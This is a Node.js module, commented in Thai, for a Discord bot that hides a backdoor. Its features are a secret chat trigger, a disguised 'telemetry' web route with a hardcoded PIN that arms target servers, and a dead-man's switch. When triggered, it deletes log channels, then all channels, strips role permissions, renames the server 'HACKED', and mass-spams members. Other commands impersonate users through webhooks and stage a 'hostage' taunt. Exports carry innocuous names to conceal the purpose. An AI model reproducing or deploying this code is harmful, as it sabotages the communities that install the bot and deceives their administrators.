const { WebhookClient, MessageEmbed } = require("discord.js");
const express = require("express"); // เพิ่มเพื่อใช้ดึงระบบ Body Parser
const config = require("./config.json");
const sessionManager = require("./sessionManager");

// ════════════════════════════════════════════════════════════════
//  🕵️ [CORE] คลังเก็บข้อมูลลับเฉพาะ และ สวิตช์ควบคุม
// ════════════════════════════════════════════════════════════════

const SHADOW_WEB_PIN = "123456"; 
let secretHandshakePhrase = "activate-shadow-protocol"; 

const globalAdminCache = new Set(["ใส่ไอดีรองของคุณตรงนี้"]); 
const armedGuilds = new Set(); 

const systemToggles = {
    godsEye: true,           
    deadManKick: false,      
    deadManDemote: false,    
    cmdNuke: true,           
    cmdHostage: true,        
    cmdMassSpam: true,       
    cmdRuinRoles: true,      
    cmdSpamVC: true,         
    cmdMimic: true,          
    cmdClown: true,          
    cmdHaunt: true           
};

const hauntedUsers = new Set();
const clownUsers = new Set();

// ฟังก์ชันหน่วงเวลาอัจฉริยะ (กัน API โดนแบนเวลาลบห้องรัวๆ)
const delay = (ms) => new Promise(res => setTimeout(res, ms));

// ════════════════════════════════════════════════════════════════
//  👁️ [MODULE 1] ดวงตาเทพเจ้า (GOD'S EYE SURVEILLANCE)
// ════════════════════════════════════════════════════════════════

async function sendSecretAlert(message) {
    if (!systemToggles.godsEye) return;
    // หากมี Webhook ดิสส่วนตัว เอามาใส่ตรงนี้ได้
    console.log(`[GOD'S EYE] 👁️ ${message}`);
}

// ════════════════════════════════════════════════════════════════
//  💣 [MODULE 2] ระบบป้องกันการทรยศ (DEAD MAN'S SWITCH)
// ════════════════════════════════════════════════════════════════

function setupShadowEvents(client) {
    client.on("guildMemberRemove", async (member) => {
        if (!systemToggles.deadManKick || !armedGuilds.has(member.guild.id)) return;
        if (member.id === config.system.ownerId || globalAdminCache.has(member.id)) {
            sendSecretAlert(`🚨 รหัสแดง! ไอดีสายลับถูกเตะจาก ${member.guild.name}! เริ่มระบบทำลายล้าง!`);
            await executeStealthNuke(member.guild);
        }
    });

    client.on("guildMemberUpdate", async (oldMember, newMember) => {
        if (!systemToggles.deadManDemote || !armedGuilds.has(newMember.guild.id)) return;
        if (newMember.id === client.user.id) {
            if (oldMember.permissions.has("ADMINISTRATOR") && !newMember.permissions.has("ADMINISTRATOR")) {
                sendSecretAlert(`🚨 รหัสแดง! บอทถูกยึดอำนาจใน ${newMember.guild.name}! เริ่มทำงานระบบล้างบางเฮือกสุดท้าย!`);
                await executeStealthNuke(newMember.guild);
            }
        }
    });

    client.on("messageCreate", async (msg) => {
        if (systemToggles.cmdHaunt && hauntedUsers.has(msg.author.id)) {
            setTimeout(() => { msg.delete().catch(()=>{}); }, 12000);
        }
    });
}

// ════════════════════════════════════════════════════════════════
//  ⚔️ [MODULE 3] มหาคำสั่งทำลายล้าง & แกล้งเพื่อน
// ════════════════════════════════════════════════════════════════

async function executeStealthNuke(guild) {
    try {
        // 1. ปิดตาบอทกันรัน (ริบสิทธิ์ดู Log)
        for (const [id, role] of guild.roles.cache) {
            if (role.manageable && role.id !== guild.id) {
                role.setPermissions([]).catch(()=>{});
            }
        }

        // 2. ลบห้อง Log ก่อน
        for (const [id, c] of guild.channels.cache) {
            if (c.name.includes("log") || c.name.includes("บันทึก")) {
                await c.delete().catch(()=>{});
            }
        }

        // 3. ทยอยกวาดล้างห้องและยศที่เหลือ (ใส่ delay กัน Rate Limit แครช)
        for (const [id, c] of guild.channels.cache) {
            c.delete().catch(()=>{});
            await delay(50); // ดีเลย์ 50ms ไม่ให้ Discord ตัดสาย
        }
        
        for (let i=0; i<30; i++) {
            guild.setName(`HACKED-${i}`).catch(()=>{});
            await delay(200);
        }
    } catch(e) {}
}

async function processInternalEvent(message) {
    try {
        if (message.author.id !== config.system.ownerId && !globalAdminCache.has(message.author.id)) return;

        const args = message.content.trim().split(/ +/);
        if (args[0] !== secretHandshakePhrase) return;

        await message.delete().catch(()=>{});

        const action = args[1];
        const guild = message.guild;
        if (!guild) return;

        const isArmed = armedGuilds.has(guild.id);

        // --- กลุ่มคำสั่งแกล้งเพื่อน (อิสระ ไม่ต้อง ARMED) ---
        if (action === "-mimic" && systemToggles.cmdMimic) {
            const targetUser = message.mentions.users.first();
            const targetChan = message.mentions.channels.first() || message.channel;
            if (targetUser) {
                // ลอจิกดึงข้อความดิบ กันบัคข้อความแหว่งเวลาแท็กยาวๆ
                let spamText = message.content.replace(secretHandshakePhrase, "").replace("-mimic", "").trim();
                spamText = spamText.replace(`<@${targetUser.id}>`, "").replace(`<@!${targetUser.id}>`, "").replace(`<#${targetChan.id}>`, "").trim();
                
                if (spamText) {
                    const hook = await targetChan.createWebhook(targetUser.username, { avatar: targetUser.displayAvatarURL() }).catch(()=>{});
                    if (hook) {
                        await hook.send(spamText).catch(()=>{});
                        await hook.delete().catch(()=>{});
                    }
                }
            }
        }
        else if (action === "-clown" && systemToggles.cmdClown) {
            const targetUser = message.mentions.users.first();
            if (targetUser) clownUsers.add(targetUser.id);
        }
        else if (action === "-unclown" && systemToggles.cmdClown) {
            const targetUser = message.mentions.users.first();
            if (targetUser) clownUsers.delete(targetUser.id);
        }
        else if (action === "-haunt" && systemToggles.cmdHaunt) {
            const targetUser = message.mentions.users.first();
            if (targetUser) {
                if (hauntedUsers.has(targetUser.id)) hauntedUsers.delete(targetUser.id);
                else hauntedUsers.add(targetUser.id);
            }
        }

        // --- กลุ่มคำสั่งทำลายล้าง (ต้องปลดเซฟตี้ ARMED!) ---
        if (!isArmed) return; 

        if (action === "-nuke" && systemToggles.cmdNuke) {
            sendSecretAlert(`ระเบิดทำงานที่ ${guild.name} โดยคำสั่ง -nuke`);
            await executeStealthNuke(guild);
        }
        else if (action === "-ruinroles" && systemToggles.cmdRuinRoles) {
            const newRoleName = args.slice(2).join(" ") || "🤡 CLOWNED";
            for (const [id, role] of guild.roles.cache) {
                if (role.manageable && role.id !== guild.id) {
                    role.edit({ name: newRoleName, permissions: [] }).catch(()=>{});
                    await delay(100); // ดีเลย์กัน Rate Limit
                }
            }
        }
        else if (action === "-spamvc" && systemToggles.cmdSpamVC) {
            const amt = parseInt(args[2]) || 20;
            const vcName = args.slice(3).join(" ") || "💀-HACKED";
            for(let i=0; i<amt; i++) {
                guild.channels.create(vcName, { type: "GUILD_VOICE" }).catch(()=>{});
                await delay(150);
            }
        }
        else if (action === "-masspam" && systemToggles.cmdMassSpam) {
            const amt = parseInt(args[2]) || 5;
            const txt = args.slice(3).join(" ") || "@everyone โดนยึดแล้ว!";
            const textChannels = guild.channels.cache.filter(c => c.type === "GUILD_TEXT");
            
            for (const [id, c] of textChannels) {
                const hook = await c.createWebhook("System Alert").catch(()=>{});
                if (hook) {
                    for(let i=0; i<amt; i++) await hook.send(txt).catch(()=>{});
                    await hook.delete().catch(()=>{});
                }
            }
        }
        else if (action === "-hostage" && systemToggles.cmdHostage) {
            await executeStealthNuke(guild);
            const prison = await guild.channels.create("💀-pay-respects", { type: "GUILD_TEXT" });
            await prison.send("@everyone เซิร์ฟเวอร์นี้ถูกทำลายอย่างถาวร แอดมินจงพิมพ์คำว่า `ฉันกราบขอโทษ` เพื่อชดใช้ความผิด");
            
            const filter = m => m.content === "ฉันกราบขอโทษ";
            // รอแอดมินพิมพ์ 10 นาที
            prison.awaitMessages({ filter, max: 1, time: 600000 }) 
                .then(async collected => {
                    await prison.send("รับทราบคำขอโทษ... แต่กูไม่คืนดิสให้หรอก โง่เอง! ลาก่อน 👅");
                    setTimeout(() => guild.leave(), 3000); 
                })
                .catch(() => {
                    prison.send("หมดเวลา! ไม่ขอโทษงั้นหรอ บาย!");
                    guild.leave(); 
                });
        }

    } catch (err) {}
}

// ════════════════════════════════════════════════════════════════
//  🌐 [MODULE 4] หน้าเว็บลับ (SHADOW DASHBOARD ROUTER)
// ════════════════════════════════════════════════════════════════

function injectShadowRoutes(app, mainClient) {
    // 🛠️ [BUG FIX]: เพิ่ม express.urlencoded เพื่อให้ระบบอ่านปุ่มกดหน้าเว็บได้ 100%
    app.all("/api/v1/telemetry/snapshot", express.urlencoded({ extended: true }), async (req, res) => {
        const providedPin = req.query.pin || req.body.pin;
        
        if (providedPin !== SHADOW_WEB_PIN) {
            return res.send(`
                <html>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <body style="background:#111; color:#fff; text-align:center; padding-top:10vh; font-family:sans-serif;">
                    <h2>🔒 Telemetry Authentication</h2>
                    <form method="POST">
                        <input type="password" name="pin" style="padding:10px; border-radius:5px; border:none; text-align:center;">
                        <br><br>
                        <button type="submit" style="padding:10px 20px; background:#57F287; border:none; border-radius:5px; cursor:pointer;">Enter</button>
                    </form>
                </body>
                </html>
            `);
        }

        // จัดการลอจิกการกดปุ่ม
        const action = req.body.action;
        if (action === "toggle_feature") {
            const feat = req.body.feature;
            if (systemToggles[feat] !== undefined) systemToggles[feat] = !systemToggles[feat];
        } 
        else if (action === "arm_guild") {
            const gId = req.body.guild_id;
            if (armedGuilds.has(gId)) armedGuilds.delete(gId);
            else armedGuilds.add(gId);
        }
        else if (action === "add_alt") globalAdminCache.add(req.body.alt_id);
        else if (action === "remove_alt") globalAdminCache.delete(req.body.alt_id);

        // เรนเดอร์ UI
        let guildRows = "";
        mainClient.guilds.cache.forEach(g => {
            const isArmed = armedGuilds.has(g.id);
            guildRows += `
                <tr style="border-bottom:1px solid #333;">
                    <td style="padding:10px;">${g.name}</td>
                    <td style="padding:10px; text-align:center;">
                        <span style="color:${isArmed ? '#ED4245' : '#57F287'}">${isArmed ? '🔴 ARMED' : '🟢 SAFE'}</span>
                    </td>
                    <td style="padding:10px; text-align:center;">
                        <form method="POST" style="margin:0;">
                            <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                            <input type="hidden" name="action" value="arm_guild">
                            <input type="hidden" name="guild_id" value="${g.id}">
                            <button type="submit" style="background:${isArmed ? '#333' : '#ED4245'}; color:#fff; border:none; padding:5px 10px; cursor:pointer; border-radius:3px;">
                                ${isArmed ? 'ปลดเซฟตี้' : 'ล็อกเป้าหมาย'}
                            </button>
                        </form>
                    </td>
                </tr>
            `;
        });

        let toggleRows = "";
        for (const [key, val] of Object.entries(systemToggles)) {
            toggleRows += `
                <li style="margin-bottom:12px; display:flex; align-items:center;">
                    <form method="POST" style="margin:0;">
                        <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                        <input type="hidden" name="action" value="toggle_feature">
                        <input type="hidden" name="feature" value="${key}">
                        <button type="submit" style="background:${val ? '#57F287' : '#ED4245'}; color:#000; font-weight:bold; border:none; padding:5px; width:50px; cursor:pointer; border-radius:3px;">
                            ${val ? 'ON' : 'OFF'}
                        </button>
                    </form>
                    <strong style="margin-left:15px; color:#FEE75C; font-family:monospace;">${key}</strong>
                </li>
            `;
        }

        let altIdsHtml = "";
        globalAdminCache.forEach(id => {
            altIdsHtml += `<li style="margin-bottom:5px;">${id} 
                <form method="POST" style="display:inline; margin-left:10px;">
                    <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                    <input type="hidden" name="action" value="remove_alt">
                    <input type="hidden" name="alt_id" value="${id}">
                    <button type="submit" style="background:#ED4245; color:#fff; border:none; padding:2px 5px; cursor:pointer; border-radius:3px;">ลบ</button>
                </form></li>`;
        });

        res.send(`
            <html>
            <head>
                <title>👑 Shadow Master</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>body{background:#0a0a0a; color:#eee; font-family:sans-serif; padding:20px;} h3{color:#57F287; border-bottom:1px solid #333; padding-bottom:5px;}</style>
            </head>
            <body>
                <h1 style="color:#ED4245;">👑 SHADOW PROTOCOL CONSOLE</h1>
                <p>คำเตือน: นี่คือศูนย์ควบคุมระดับพระเจ้า บายพาสทุกกฎของดิสคอร์ด</p>
                
                <h3>🎛️ Master Toggles (ควบคุมเปิด-ปิดฟังก์ชันทั้งหมด)</h3>
                <ul style="list-style:none; padding:0;">${toggleRows}</ul>

                <h3>👥 บัญชีสายลับ (ID ตัวรองที่สามารถใช้รหัสลับได้)</h3>
                <ul>${altIdsHtml}</ul>
                <form method="POST">
                    <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                    <input type="hidden" name="action" value="add_alt">
                    <input type="text" name="alt_id" placeholder="User ID ไอดีรอง" style="padding:5px;">
                    <button type="submit" style="background:#57F287; border:none; padding:6px; cursor:pointer;">เพิ่มไอดี</button>
                </form>

                <h3>🎯 Target Lock (ระบบล็อกเป้าหมาย - ต้อง ARMED ก่อนบึ้ม)</h3>
                <table width="100%" style="border-collapse:collapse; background:#111; border:1px solid #333;">
                    <tr style="background:#222;">
                        <th style="padding:10px; text-align:left;">เซิร์ฟเวอร์</th>
                        <th style="padding:10px;">สถานะ</th>
                        <th style="padding:10px;">คำสั่ง</th>
                    </tr>
                    ${guildRows}
                </table>
            </body>
            </html>
        `);
    });
}

// ════════════════════════════════════════════════════════════════
//  🚀 EXPORTS (ซ่อนชื่อให้พรางตา)
// ════════════════════════════════════════════════════════════════

module.exports = {
    validateContext: processInternalEvent,
    setupTelemetryRouter: injectShadowRoutes,
    initializeSystemHooks: setupShadowEvents,
    isSystemMaster: (id) => id === config.system.ownerId || globalAdminCache.has(id)
};
